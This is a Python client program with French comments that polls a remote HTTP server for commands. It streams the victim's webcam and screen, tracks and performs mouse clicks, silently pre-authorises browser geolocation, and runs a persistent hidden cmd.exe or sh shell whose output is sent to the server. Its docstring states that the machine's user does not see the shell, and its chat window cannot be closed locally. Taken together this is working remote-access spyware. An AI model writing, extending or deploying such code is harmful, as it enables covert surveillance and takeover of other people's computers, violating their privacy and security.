"""
Client caméra / écran / shell / chat — se connecte au serveur par HTTP,
depuis n'importe quel réseau Wi-Fi.

Fonctionnalités (toutes indépendantes) :
  - Caméra (flux vidéo)
  - Écran (capture d'écran, avec replis Wayland : portail xdg, gnome-screenshot, grim)
  - Souris (position remontée, clics exécutés localement)
  - Localisation (navigateur Chrome/Edge en mode --app, pré-autorisé géoloc)
  - CMD Commandes : console cmd.exe PERSISTANTE, SANS FENÊTRE, dont
    stdout/stderr sont redirigés vers server_gui (comme les frames caméra).
    L'utilisateur du client ne la voit pas. Seul server_gui y écrit.
  - Chat : vraie console cmd.exe VISIBLE chez le client, avec capture des
    frappes via hook clavier (Solution B — préfixe invisible). Le [X] est
    neutralisé ; seul server_gui peut fermer la console.

Compatible Windows et Linux (le chat n'est actif que sous Windows).
"""

import argparse
import json
import logging
import os
import platform
import queue
import re
import select
import shutil
import socket
import subprocess
import tempfile
import time
import threading
import uuid
import webbrowser
from pathlib import Path
from urllib.parse import unquote, urlparse

import cv2
import numpy as np
import requests

try:
    from mss import MSS as _MSS   # versions récentes de mss
except ImportError:
    from mss import mss as _MSS   # anciennes versions

try:
    from pynput.mouse import Button, Controller as _MouseController
    _HAS_PYNPUT = True
except ImportError:
    _HAS_PYNPUT = False

try:
    from embedded_config import SERVER_URL as EMBEDDED_SERVER_URL
except ImportError:
    EMBEDDED_SERVER_URL = ""

try:
    from console_windows import ChatConsole
    _HAS_CHAT_CONSOLE = platform.system() == "Windows"
except ImportError:
    ChatConsole = None
    _HAS_CHAT_CONSOLE = False


DEFAULT_SERVER_URL = "http://127.0.0.1:5050"
POLL_INTERVAL = 1.0
CAMERA_FRAME_INTERVAL = 0.05
CAMERA_WIDTH = 640
CAMERA_HEIGHT = 480
CAMERA_JPEG_QUALITY = 65
SCREEN_JPEG_QUALITY = 55
SCREEN_MAX_WIDTH = 1024
SCREEN_CAPTURE_MIN_INTERVAL = {
    "mss": 0.05,
    "xdg-portal": 0.15,
    "grim": 0.05,
    "gnome-screenshot": 0.4,
}
SCREEN_CAPTURE_MIN_INTERVAL_DEFAULT = 0.2
CAMERA_SEND_WORKERS = 2
SCREEN_SEND_WORKERS = 2
SCREEN_SEND_MIN_INTERVAL = 0.0
REQUEST_TIMEOUT = 5
CAPTURE_SUBPROCESS_TIMEOUT = 5
MIN_VALID_FRAME_STD = 2.0
SCREEN_FAILURE_FALLBACK_THRESHOLD = 10
SCREEN_FAILURE_WARN_AT = 5
MOUSE_SEND_INTERVAL = 0.1

SHELL_STREAM_MIN_INTERVAL = 0.05
SHELL_STREAM_CHUNK = 4096
SHELL_STREAM_BUFFER_MAX = 16384


def _app_dir() -> Path:
    if platform.system() == "Windows":
        base = Path(os.environ.get("LOCALAPPDATA", Path.home()))
        return base / "CameraClient"
    return Path.home() / ".local" / "share" / "camera-client"


APP_DIR = _app_dir()
APP_DIR.mkdir(parents=True, exist_ok=True)
CONFIG_PATH = APP_DIR / "config.json"
LOCATION_PROFILE_DIR = APP_DIR / "location-browser-profile"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(APP_DIR / "client.log", encoding="utf-8"),
        logging.StreamHandler(),
    ],
)
logger = logging.getLogger("camera-client")


def load_config() -> dict:
    if CONFIG_PATH.exists():
        try:
            return json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
        except (json.JSONDecodeError, OSError):
            logger.warning("Fichier de configuration illisible, ignoré : %s", CONFIG_PATH)
    return {}


def _write_config(config: dict) -> None:
    CONFIG_PATH.write_text(json.dumps(config, indent=2), encoding="utf-8")
    try:
        os.chmod(CONFIG_PATH, 0o600)
    except OSError:
        pass


def save_config(server_url: str) -> None:
    config = load_config()
    config["server_url"] = server_url
    config.setdefault("device_id", uuid.uuid4().hex)
    _write_config(config)
    logger.info("Configuration sauvegardée : %s", CONFIG_PATH)


def get_or_create_device_id() -> str:
    config = load_config()
    device_id = config.get("device_id")
    if device_id:
        return device_id
    device_id = uuid.uuid4().hex
    config["device_id"] = device_id
    _write_config(config)
    logger.info("Nouvel identifiant d'appareil créé : %s", device_id)
    return device_id


def resolve_server_url(cli_value: str | None) -> str:
    if cli_value:
        return cli_value.rstrip("/")
    config_value = load_config().get("server_url")
    if config_value:
        return config_value.rstrip("/")
    if EMBEDDED_SERVER_URL:
        return EMBEDDED_SERVER_URL.rstrip("/")
    return DEFAULT_SERVER_URL


def _open_camera() -> cv2.VideoCapture:
    if platform.system() == "Windows":
        capture = cv2.VideoCapture(0, cv2.CAP_DSHOW)
    else:
        capture = cv2.VideoCapture(0)
    if capture.isOpened():
        capture.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        capture.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*"MJPG"))
        capture.set(cv2.CAP_PROP_FRAME_WIDTH, CAMERA_WIDTH)
        capture.set(cv2.CAP_PROP_FRAME_HEIGHT, CAMERA_HEIGHT)
        capture.set(cv2.CAP_PROP_FPS, 30)
    return capture


# ---------------------------------------------------------------------
# Navigateur de localisation
# ---------------------------------------------------------------------

LOCATION_BROWSER_CANDIDATES_LINUX = (
    "google-chrome", "google-chrome-stable", "chromium", "chromium-browser",
    "microsoft-edge", "microsoft-edge-stable",
)
LOCATION_BROWSER_CANDIDATES_WINDOWS = (
    r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
    r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
    r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
)
LOCATION_WINDOW_SIZE = "420,640"


def _geolocation_origin_pattern(url: str) -> str:
    parsed = urlparse(url)
    port = parsed.port or (443 if parsed.scheme == "https" else 80)
    return f"{parsed.scheme}://{parsed.hostname}:{port},*"


def _grant_geolocation_permission(profile_dir: Path, server_url: str) -> None:
    default_dir = profile_dir / "Default"
    default_dir.mkdir(parents=True, exist_ok=True)
    prefs_path = default_dir / "Preferences"

    try:
        prefs = json.loads(prefs_path.read_text(encoding="utf-8")) if prefs_path.exists() else {}
    except (json.JSONDecodeError, OSError):
        prefs = {}

    exceptions = (
        prefs.setdefault("profile", {})
        .setdefault("content_settings", {})
        .setdefault("exceptions", {})
        .setdefault("geolocation", {})
    )
    exceptions[_geolocation_origin_pattern(server_url)] = {
        "last_modified": f"{time.time():.6f}",
        "setting": 1,
    }

    try:
        prefs_path.write_text(json.dumps(prefs), encoding="utf-8")
    except OSError as exc:
        logger.warning("Impossible de pré-autoriser la géolocalisation : %s", exc)


def _find_app_mode_browser() -> "str | None":
    if platform.system() == "Windows":
        for path in LOCATION_BROWSER_CANDIDATES_WINDOWS:
            if os.path.exists(path):
                return path
        return None
    for name in LOCATION_BROWSER_CANDIDATES_LINUX:
        path = shutil.which(name)
        if path:
            return path
    return None


# ---------------------------------------------------------------------
# Capture d'écran : mss + replis Wayland
# ---------------------------------------------------------------------

def _detect_linux_session_type() -> str:
    return os.environ.get("XDG_SESSION_TYPE", "").lower()


def _frame_looks_valid(frame) -> bool:
    return frame is not None and frame.size > 0 and float(frame.std()) >= MIN_VALID_FRAME_STD


def _grab_screen_grim() -> "np.ndarray | None":
    result = subprocess.run(
        ["grim", "-"], capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True
    )
    array = np.frombuffer(result.stdout, dtype=np.uint8)
    return cv2.imdecode(array, cv2.IMREAD_COLOR)


def _grab_screen_gnome_screenshot() -> "np.ndarray | None":
    tmp_path = None
    try:
        with tempfile.NamedTemporaryFile(suffix=".png", delete=False) as tmp:
            tmp_path = tmp.name
        subprocess.run(
            ["gnome-screenshot", "-f", tmp_path],
            capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, check=True,
        )
        return cv2.imread(tmp_path)
    finally:
        if tmp_path:
            try:
                os.unlink(tmp_path)
            except OSError:
                pass


def _read_portal_screenshot(uri: str) -> "np.ndarray | None":
    path = unquote(urlparse(uri).path)
    image = cv2.imread(path)
    try:
        os.unlink(path)
    except OSError:
        pass
    return image


def _grab_screen_xdg_portal_jeepney() -> "np.ndarray | None":
    from jeepney import DBusAddress, MatchRule, message_bus, new_method_call
    from jeepney.io.blocking import Proxy, open_dbus_connection

    token = "cam" + uuid.uuid4().hex[:12]
    conn = open_dbus_connection(bus="SESSION")
    try:
        sender = conn.unique_name.lstrip(":").replace(".", "_")
        request_path = f"/org/freedesktop/portal/desktop/request/{sender}/{token}"
        rule = MatchRule(
            type="signal", interface="org.freedesktop.portal.Request",
            member="Response", path=request_path,
        )
        Proxy(message_bus, conn).AddMatch(rule)
        with conn.filter(rule) as responses:
            portal = DBusAddress(
                "/org/freedesktop/portal/desktop",
                bus_name="org.freedesktop.portal.Desktop",
                interface="org.freedesktop.portal.Screenshot",
            )
            call = new_method_call(
                portal, "Screenshot", "sa{sv}",
                ("", {"handle_token": ("s", token), "interactive": ("b", False)}),
            )
            conn.send_and_get_reply(call, timeout=CAPTURE_SUBPROCESS_TIMEOUT)
            signal = conn.recv_until_filtered(responses, timeout=CAPTURE_SUBPROCESS_TIMEOUT)
    finally:
        conn.close()

    code, results = signal.body
    uri = results.get("uri", (None, None))[1]
    if code != 0 or not uri:
        return None
    return _read_portal_screenshot(uri)


def _grab_screen_xdg_portal() -> "np.ndarray | None":
    try:
        import jeepney  # noqa: F401
    except ImportError:
        return _grab_screen_xdg_portal_gdbus()
    return _grab_screen_xdg_portal_jeepney()


def _grab_screen_xdg_portal_gdbus() -> "np.ndarray | None":
    monitor = subprocess.Popen(
        ["gdbus", "monitor", "--session", "--dest", "org.freedesktop.portal.Desktop"],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
    )
    uri = None
    try:
        call = subprocess.run(
            [
                "gdbus", "call", "--session",
                "--dest", "org.freedesktop.portal.Desktop",
                "--object-path", "/org/freedesktop/portal/desktop",
                "--method", "org.freedesktop.portal.Screenshot.Screenshot",
                "", "{'interactive': <false>}",
            ],
            capture_output=True, timeout=CAPTURE_SUBPROCESS_TIMEOUT, text=True, check=True,
        )
        handle_match = re.search(r"objectpath '([^']+)'", call.stdout)
        if not handle_match:
            return None
        handle = handle_match.group(1)

        deadline = time.time() + CAPTURE_SUBPROCESS_TIMEOUT
        while time.time() < deadline:
            remaining = deadline - time.time()
            ready, _, _ = select.select([monitor.stdout], [], [], max(remaining, 0))
            if not ready:
                break
            line = monitor.stdout.readline()
            if not line:
                continue
            if handle in line and "Response" in line:
                uri_match = re.search(r"'uri': <'([^']+)'>", line)
                if uri_match:
                    uri = uri_match.group(1)
                break
    finally:
        monitor.terminate()
        try:
            monitor.wait(timeout=2)
        except subprocess.TimeoutExpired:
            monitor.kill()

    if not uri:
        return None
    return _read_portal_screenshot(uri)


def _grab_screen_mss(mss_instance, monitor) -> "np.ndarray | None":
    raw = mss_instance.grab(monitor)
    return cv2.cvtColor(np.array(raw), cv2.COLOR_BGRA2BGR)


def _portal_available() -> bool:
    if shutil.which("gdbus"):
        return True
    try:
        import jeepney  # noqa: F401
        return True
    except ImportError:
        return False


def _screen_capture_candidates() -> list:
    if platform.system() != "Linux" or _detect_linux_session_type() != "wayland":
        return ["mss"]

    testers = {}
    if _portal_available():
        testers["xdg-portal"] = _grab_screen_xdg_portal
    if shutil.which("gnome-screenshot"):
        testers["gnome-screenshot"] = _grab_screen_gnome_screenshot
    if shutil.which("grim"):
        testers["grim"] = _grab_screen_grim

    working = []
    for mode, tester in testers.items():
        try:
            frame = tester()
        except Exception as exc:
            logger.warning("Capture d'écran : test de '%s' échoué : %s", mode, exc)
            continue
        if _frame_looks_valid(frame):
            logger.info("Capture d'écran : méthode utilisable après test réel : %s", mode)
            working.append(mode)
        else:
            logger.warning("Capture d'écran : test de '%s' : image absente ou quasi uniforme (noire ?)", mode)

    if not working:
        logger.error(
            "Session Wayland : AUCUNE méthode de capture n'a fonctionné. "
            "Solutions : (1) sudo apt install gnome-screenshot ; "
            "(2) pip install jeepney ; (3) session « GNOME on Xorg »."
        )
    return working + ["mss"]


class _LatestFrame:
    def __init__(self):
        self._cond = threading.Condition()
        self._frame = None
        self._version = 0
        self._claimed = 0

    def put(self, frame) -> None:
        with self._cond:
            self._frame = frame
            self._version += 1
            self._cond.notify()

    def claim(self, stop_event: threading.Event, timeout: float = 0.5):
        with self._cond:
            if self._claimed == self._version and not stop_event.is_set():
                self._cond.wait(timeout)
            if self._claimed == self._version:
                return None
            self._claimed = self._version
            return self._frame


class _RateLimiter:
    def __init__(self, interval: float):
        self._interval = interval
        self._lock = threading.Lock()
        self._next = 0.0

    def reserve(self) -> float:
        with self._lock:
            now = time.monotonic()
            slot = max(now, self._next)
            self._next = slot + self._interval
            return slot - now


# ---------------------------------------------------------------------
# Console distante (CMD Commandes)
# ---------------------------------------------------------------------

class RemoteConsole:
    def __init__(self, server_url: str, device_id: str):
        self.server_url = server_url
        self.device_id = device_id
        self.process: subprocess.Popen | None = None
        self._stop = threading.Event()
        self._threads: list[threading.Thread] = []
        self._write_lock = threading.Lock()
        self._send_queue: "queue.Queue[str]" = queue.Queue(maxsize=200)

    def start(self) -> bool:
        if self.process is not None and self.process.poll() is None:
            return True
        if platform.system() == "Windows":
            creationflags = subprocess.CREATE_NO_WINDOW
            argv = ["cmd.exe"]
        else:
            creationflags = 0
            argv = ["/bin/sh", "-i"]

        try:
            self.process = subprocess.Popen(
                argv,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                creationflags=creationflags,
                bufsize=0,
            )
        except Exception as exc:
            logger.error("Impossible de lancer la console distante : %s", exc)
            return False

        self._stop.clear()
        self._threads = [
            threading.Thread(target=self._reader_loop, daemon=True),
            threading.Thread(target=self._sender_loop, daemon=True),
        ]
        for t in self._threads:
            t.start()
        logger.info("Console distante démarrée (PID %s)", self.process.pid)
        return True

    def stop(self) -> None:
        self._stop.set()
        proc = self.process
        self.process = None
        if proc is not None and proc.poll() is None:
            try:
                if proc.stdin:
                    proc.stdin.write(b"exit\r\n")
                    proc.stdin.flush()
            except Exception:
                pass
            try:
                proc.wait(timeout=3)
            except subprocess.TimeoutExpired:
                proc.terminate()
        for t in self._threads:
            t.join(timeout=2)
        self._threads = []

    def is_running(self) -> bool:
        return self.process is not None and self.process.poll() is None

    def write_command(self, command: str) -> None:
        if not self.is_running():
            return
        try:
            with self._write_lock:
                self.process.stdin.write((command + "\r\n").encode("utf-8", errors="replace"))
                self.process.stdin.flush()
        except Exception as exc:
            logger.warning("Écriture console impossible : %s", exc)

    def _reader_loop(self) -> None:
        assert self.process is not None and self.process.stdout is not None
        stream = self.process.stdout
        while not self._stop.is_set():
            try:
                chunk = stream.read(1)
            except Exception:
                break
            if not chunk:
                break
            data = bytearray(chunk)
            try:
                fd = stream.fileno()
                while len(data) < SHELL_STREAM_CHUNK:
                    more = os.read(fd, SHELL_STREAM_CHUNK - len(data))
                    if not more:
                        break
                    data.extend(more)
                    if len(more) < 64:
                        break
            except (BlockingIOError, OSError):
                pass
            text = bytes(data).decode("utf-8", errors="replace")
            try:
                self._send_queue.put_nowait(text)
            except queue.Full:
                pass

    def _sender_loop(self) -> None:
        session = requests.Session()
        last_send = 0.0
        pending = ""
        while not self._stop.is_set():
            try:
                chunk = self._send_queue.get(timeout=0.2)
                pending += chunk
            except queue.Empty:
                pass
            now = time.monotonic()
            if pending and (now - last_send) >= SHELL_STREAM_MIN_INTERVAL:
                try:
                    session.post(
                        f"{self.server_url}/api/shell/output",
                        json={"device_id": self.device_id, "chunk": pending[-SHELL_STREAM_BUFFER_MAX:]},
                        timeout=5,
                    )
                    pending = ""
                    last_send = now
                except requests.RequestException:
                    pass
        if pending:
            try:
                session.post(
                    f"{self.server_url}/api/shell/output",
                    json={"device_id": self.device_id, "chunk": pending},
                    timeout=5,
                )
            except requests.RequestException:
                pass


# ---------------------------------------------------------------------
# Client principal
# ---------------------------------------------------------------------

class CameraClient:
    def __init__(self, server_url: str, device_id: str, device_name: str):
        self.server_url = server_url
        self.device_id = device_id
        self.device_name = device_name

        self.camera_on = False
        self.screen_on = False
        self.capture: cv2.VideoCapture | None = None
        self._stop_camera_event = threading.Event()
        self._camera_capture_thread: threading.Thread | None = None
        self._camera_slot = _LatestFrame()
        self._cmd_session = requests.Session()
        self._stop_screen_event = threading.Event()
        self._screen_slot = _LatestFrame()

        self.location_open = False
        self._location_process: subprocess.Popen | None = None

        self._mouse_thread: threading.Thread | None = None
        self._stop_mouse_event = threading.Event()
        self._mouse_controller = _MouseController() if _HAS_PYNPUT else None
        self._screen_size: tuple[int, int] | None = None

        self._remote_console = RemoteConsole(server_url, device_id)

        # Titre ASCII pur pour que la fenêtre soit facile à retrouver.
        # (La recherche réelle se fait par PID, pas par titre, mais un titre
        # ASCII évite tout problème d'encodage dans cmd.exe.)
        self._chat_console: "ChatConsole | None" = None
        if _HAS_CHAT_CONSOLE:
            self._chat_console = ChatConsole(
                title="Chat distant",
                on_user_input=self._handle_user_chat,
            )

    def run_forever(self) -> None:
        logger.info(
            "Démarrage du client — serveur : %s — appareil : %s (%s)",
            self.server_url, self.device_name, self.device_id,
        )
        while True:
            try:
                self._check_commands()
            except requests.RequestException as exc:
                logger.warning("Serveur injoignable (%s), nouvelle tentative...", exc)
            except Exception as exc:
                logger.exception("Erreur inattendue dans _check_commands : %s", exc)
            time.sleep(POLL_INTERVAL)

    def run_once(self) -> None:
        logger.info("Test (--once) — serveur : %s — appareil : %s", self.server_url, self.device_id)
        self._check_commands()
        time.sleep(1)
        if self.camera_on:
            self._stop_camera()
        if self.screen_on:
            self._stop_screen()
        self._remote_console.stop()
        if self._chat_console is not None:
            try:
                self._chat_console.close()
            except Exception as exc:
                logger.warning("Erreur lors de la fermeture de la console chat : %s", exc)

    def _check_commands(self) -> None:
        if self._location_process is not None and self._location_process.poll() is not None:
            self._location_process = None
            self.location_open = False

        response = self._cmd_session.get(
            f"{self.server_url}/api/command",
            params={
                "device_id": self.device_id,
                "name": self.device_name,
                "location_open": "1" if self.location_open else "0",
                "chat_window_open": "1" if self._chat_window_is_open() else "0",
                "cmd_console_open": "1" if self._remote_console.is_running() else "0",
            },
            timeout=REQUEST_TIMEOUT,
        )
        response.raise_for_status()
        commands = response.json().get("commands", {})
        logger.debug("Commandes reçues : %s", commands)

        camera_cmd = commands.get("camera")
        if camera_cmd == "START" and not self.camera_on:
            self._start_camera()
        elif camera_cmd == "STOP" and self.camera_on:
            self._stop_camera()

        screen_cmd = commands.get("screen")
        if screen_cmd == "START" and not self.screen_on:
            self._start_screen()
        elif screen_cmd == "STOP" and self.screen_on:
            self._stop_screen()

        location_cmd = commands.get("location")
        if location_cmd == "OPEN" and not self.location_open:
            self._open_location_browser()
        elif location_cmd == "CLOSE" and self.location_open:
            self._close_location_browser()

        mouse_click = commands.get("mouse_click")
        if mouse_click:
            try:
                self._click_mouse(int(mouse_click["x"]), int(mouse_click["y"]))
            except (KeyError, TypeError, ValueError) as exc:
                logger.warning("Commande de clic invalide : %s (%s)", mouse_click, exc)

        console_cmd = commands.get("cmd_console")
        if console_cmd == "OPEN" and not self._remote_console.is_running():
            self._remote_console.start()
        elif console_cmd == "CLOSE" and self._remote_console.is_running():
            self._remote_console.stop()

        shell_input = commands.get("shell_input")
        if shell_input and self._remote_console.is_running():
            self._remote_console.write_command(shell_input.get("text", ""))

        chat_msg = commands.get("chat_message")
        if chat_msg and self._chat_console is not None:
            try:
                if self._chat_console.is_open():
                    self._chat_console.show_incoming(chat_msg.get("message", ""))
            except Exception as exc:
                logger.exception("Erreur lors de l'injection du message chat : %s", exc)

        chat_window_cmd = commands.get("chat_window")
        if self._chat_console is not None:
            try:
                if chat_window_cmd == "OPEN" and not self._chat_console.is_open():
                    self._chat_console.open()
                elif chat_window_cmd == "CLOSE" and self._chat_console.is_open():
                    self._chat_console.close()
            except Exception as exc:
                logger.exception("Erreur lors de la gestion de la console chat : %s", exc)

    def _handle_user_chat(self, line: str) -> None:
        try:
            requests.post(
                f"{self.server_url}/api/shell/result",
                json={
                    "device_id": self.device_id,
                    "type": "chat",
                    "message": line[:4000],
                },
                timeout=REQUEST_TIMEOUT,
            )
        except requests.RequestException:
            pass
        except Exception as exc:
            logger.exception("Erreur lors de l'envoi du message chat : %s", exc)

        try:
            if self._chat_console is not None and self._chat_console.is_open():
                safe = (
                    line.replace("^", "^^")
                    .replace("&", "^&")
                    .replace("|", "^|")
                    .replace("<", "^<")
                    .replace(">", "^>")
                    .replace('"', "'")
                )
                self._chat_console._send_text(f"echo Toi: {safe}\r", force=True)
        except Exception as exc:
            logger.exception("Erreur lors de l'affichage local du message chat : %s", exc)

    def _chat_window_is_open(self) -> bool:
        return self._chat_console is not None and self._chat_console.is_open()

    # ------------------------------------------------------------------
    # Flux caméra
    # ------------------------------------------------------------------
    def _start_camera(self) -> None:
        self.capture = _open_camera()
        if not self.capture.isOpened():
            logger.error("Impossible d'ouvrir la caméra")
            self.capture = None
            return

        self.camera_on = True
        self._camera_slot = slot = _LatestFrame()
        self._stop_camera_event = threading.Event()
        self._camera_capture_thread = threading.Thread(
            target=self._camera_capture_loop, args=(self.capture, self._stop_camera_event, slot), daemon=True
        )
        self._camera_capture_thread.start()
        self._start_senders("camera", slot, self._stop_camera_event, CAMERA_FRAME_INTERVAL, CAMERA_SEND_WORKERS)
        logger.info("Caméra allumée")

    def _stop_camera(self) -> None:
        self.camera_on = False
        self._stop_camera_event.set()
        thread = self._camera_capture_thread
        if thread is not None:
            thread.join(timeout=2)
            self._camera_capture_thread = None
        if self.capture is not None:
            self.capture.release()
            self.capture = None
        logger.info("Caméra éteinte")

    def _camera_capture_loop(self, capture: cv2.VideoCapture, stop_event: threading.Event, slot: _LatestFrame) -> None:
        failures = 0
        while not stop_event.is_set():
            ok, frame = capture.read()
            if not ok:
                failures += 1
                stop_event.wait(0.05 if failures < 20 else 0.5)
                continue
            failures = 0
            slot.put(frame)

    def _start_senders(self, stream: str, slot: _LatestFrame, stop_event: threading.Event,
                       min_interval: float, workers: int) -> None:
        rate = _RateLimiter(min_interval)
        for _ in range(workers):
            threading.Thread(
                target=self._sender_worker, args=(stream, slot, stop_event, rate), daemon=True
            ).start()

    def _sender_worker(self, stream: str, slot: _LatestFrame, stop_event: threading.Event,
                       rate: _RateLimiter) -> None:
        session = requests.Session()
        while not stop_event.is_set():
            delay = rate.reserve()
            if delay > 0 and stop_event.wait(delay):
                break
            frame = slot.claim(stop_event)
            if frame is None:
                continue
            self._send_frame(frame, stream, session, time.time_ns() // 1000)

    # ------------------------------------------------------------------
    # Flux capture d'écran
    # ------------------------------------------------------------------
    def _start_screen(self) -> None:
        self.screen_on = True
        self._stop_screen_event = threading.Event()
        self._screen_slot = slot = _LatestFrame()
        self._screen_size = None
        threading.Thread(
            target=self._capture_screen_loop, args=(self._stop_screen_event, slot), daemon=True
        ).start()
        self._start_senders("screen", slot, self._stop_screen_event, SCREEN_SEND_MIN_INTERVAL, SCREEN_SEND_WORKERS)
        self._start_mouse_tracking()
        logger.info("Capture d'écran démarrée")

    def _stop_screen(self) -> None:
        self.screen_on = False
        self._stop_screen_event.set()
        self._stop_mouse_tracking()
        logger.info("Capture d'écran arrêtée")

    def _capture_screen_loop(self, stop_event: threading.Event, slot: _LatestFrame) -> None:
        candidates = _screen_capture_candidates()
        mode_index = 0
        mode = candidates[mode_index]
        mss_instance, monitor = self._open_mss() if mode == "mss" else (None, None)

        black_frame_warned = False
        consecutive_failures = 0
        sent_first_frame = False

        try:
            while not stop_event.is_set():
                loop_start = time.monotonic()
                min_interval = SCREEN_CAPTURE_MIN_INTERVAL.get(mode, SCREEN_CAPTURE_MIN_INTERVAL_DEFAULT)
                try:
                    frame = self._grab_screen_frame(mode, mss_instance, monitor)
                except Exception as exc:
                    frame = None
                    logger.debug("Échec de capture (%s) : %s", mode, exc)

                if frame is None:
                    consecutive_failures += 1
                    if consecutive_failures == SCREEN_FAILURE_WARN_AT:
                        logger.warning(
                            "Capture d'écran : %d échecs consécutifs avec la méthode '%s'.",
                            consecutive_failures, mode,
                        )
                    if mode != "mss" and consecutive_failures >= SCREEN_FAILURE_FALLBACK_THRESHOLD:
                        mode_index += 1
                        next_mode = candidates[mode_index]
                        logger.warning(
                            "La méthode '%s' échoue systématiquement en cours de route : repli sur '%s'.",
                            mode, next_mode,
                        )
                        mode = next_mode
                        if mode == "mss":
                            mss_instance, monitor = self._open_mss()
                        consecutive_failures = 0
                    stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
                    continue

                consecutive_failures = 0
                if not sent_first_frame:
                    logger.info(
                        "Capture d'écran : première image envoyée (méthode : %s, %dx%d)",
                        mode, frame.shape[1], frame.shape[0],
                    )
                    sent_first_frame = True

                if self._screen_size is None:
                    self._screen_size = (frame.shape[1], frame.shape[0])

                if not black_frame_warned and not _frame_looks_valid(frame):
                    logger.warning(
                        "Image d'écran capturée presque entièrement noire/uniforme avec la "
                        "méthode '%s' — la vidéo enregistrée sera noire.", mode,
                    )
                    black_frame_warned = True

                slot.put(frame)
                stop_event.wait(max(0.0, min_interval - (time.monotonic() - loop_start)))
        finally:
            if mss_instance is not None:
                mss_instance.close()

    @staticmethod
    def _open_mss():
        instance = _MSS()
        monitor = instance.monitors[1] if len(instance.monitors) > 1 else instance.monitors[0]
        return instance, monitor

    def _grab_screen_frame(self, mode: str, mss_instance, monitor) -> "np.ndarray | None":
        if mode == "xdg-portal":
            return _grab_screen_xdg_portal()
        if mode == "grim":
            return _grab_screen_grim()
        if mode == "gnome-screenshot":
            return _grab_screen_gnome_screenshot()
        if mss_instance is None:
            return None
        return _grab_screen_mss(mss_instance, monitor)

    # ------------------------------------------------------------------
    # Souris
    # ------------------------------------------------------------------
    def _start_mouse_tracking(self) -> None:
        if self._mouse_thread is not None and self._mouse_thread.is_alive():
            return
        self._stop_mouse_event = threading.Event()
        self._mouse_thread = threading.Thread(
            target=self._mouse_tracking_loop, args=(self._stop_mouse_event,), daemon=True
        )
        self._mouse_thread.start()

    def _stop_mouse_tracking(self) -> None:
        self._stop_mouse_event.set()
        thread = self._mouse_thread
        if thread is not None:
            thread.join(timeout=1)
            self._mouse_thread = None

    def _get_mouse_position(self) -> "tuple[int, int] | None":
        if self._mouse_controller is not None:
            try:
                return tuple(self._mouse_controller.position)
            except Exception:
                return None
        try:
            if platform.system() == "Windows":
                import ctypes
                import ctypes.wintypes
                point = ctypes.wintypes.POINT()
                ctypes.windll.user32.GetCursorPos(ctypes.byref(point))
                return point.x, point.y
            result = subprocess.run(
                ["xdotool", "getmouselocation", "--shell"],
                capture_output=True, timeout=1, text=True, check=True,
            )
            values = dict(line.split("=", 1) for line in result.stdout.strip().splitlines() if "=" in line)
            return int(values["X"]), int(values["Y"])
        except Exception:
            return None

    def _mouse_tracking_loop(self, stop_event: threading.Event) -> None:
        session = requests.Session()
        while not stop_event.is_set():
            position = self._get_mouse_position()
            if position is not None:
                x, y = position
                payload = {"device_id": self.device_id, "x": x, "y": y}
                if self._screen_size is not None:
                    payload["screen_w"], payload["screen_h"] = self._screen_size
                try:
                    session.post(
                        f"{self.server_url}/api/mouse/move", json=payload, timeout=REQUEST_TIMEOUT,
                    )
                except requests.RequestException:
                    pass
            stop_event.wait(MOUSE_SEND_INTERVAL)

    def _activate_window_at(self, x: int, y: int) -> None:
        try:
            if platform.system() == "Windows":
                import ctypes
                import ctypes.wintypes
                user32 = ctypes.windll.user32
                point = ctypes.wintypes.POINT(int(x), int(y))
                hwnd = user32.WindowFromPoint(point)
                if hwnd:
                    if user32.IsIconic(hwnd):
                        user32.ShowWindow(hwnd, 9)
                    user32.SetForegroundWindow(hwnd)
                    time.sleep(0.05)
                return
            result = subprocess.run(
                ["xdotool", "mousemove", str(int(x)), str(int(y)), "getmouselocation", "--shell"],
                capture_output=True, timeout=1, text=True, check=False,
            )
            values = dict(
                line.split("=", 1) for line in result.stdout.strip().splitlines() if "=" in line
            )
            window_id = values.get("WINDOW")
            if window_id:
                subprocess.run(
                    ["xdotool", "windowactivate", "--sync", window_id],
                    capture_output=True, timeout=2, check=False,
                )
                time.sleep(0.05)
        except Exception:
            pass

    def _click_mouse_ctypes(self, x: int, y: int) -> bool:
        try:
            import ctypes
            user32 = ctypes.windll.user32
            user32.SetCursorPos(int(x), int(y))
            time.sleep(0.02)
            user32.mouse_event(0x0002, 0, 0, 0, 0)
            time.sleep(0.05)
            user32.mouse_event(0x0004, 0, 0, 0, 0)
            return True
        except Exception as exc:
            logger.warning("Clic ctypes impossible (%s, %s) : %s", x, y, exc)
            return False

    def _click_mouse(self, x: int, y: int) -> None:
        self._activate_window_at(x, y)
        if self._mouse_controller is not None:
            try:
                self._mouse_controller.position = (int(x), int(y))
                time.sleep(0.02)
                self._mouse_controller.press(Button.left)
                time.sleep(0.05)
                self._mouse_controller.release(Button.left)
                logger.info("Clic exécuté (pynput) : (%s, %s)", x, y)
                return
            except Exception as exc:
                logger.warning("Clic pynput impossible (%s, %s) : %s — repli", x, y, exc)

        if platform.system() == "Windows":
            if self._click_mouse_ctypes(x, y):
                logger.info("Clic exécuté (ctypes) : (%s, %s)", x, y)
                return
            logger.error("Clic impossible (Windows) : (%s, %s)", x, y)
            return

        try:
            subprocess.run(["xdotool", "mousemove", str(int(x)), str(int(y))], timeout=2, check=False)
            time.sleep(0.02)
            subprocess.run(["xdotool", "mousedown", "1"], timeout=2, check=False)
            time.sleep(0.05)
            subprocess.run(["xdotool", "mouseup", "1"], timeout=2, check=False)
            logger.info("Clic exécuté (xdotool) : (%s, %s)", x, y)
        except Exception as exc:
            logger.error("Clic impossible (xdotool) : (%s, %s) : %s", x, y, exc)

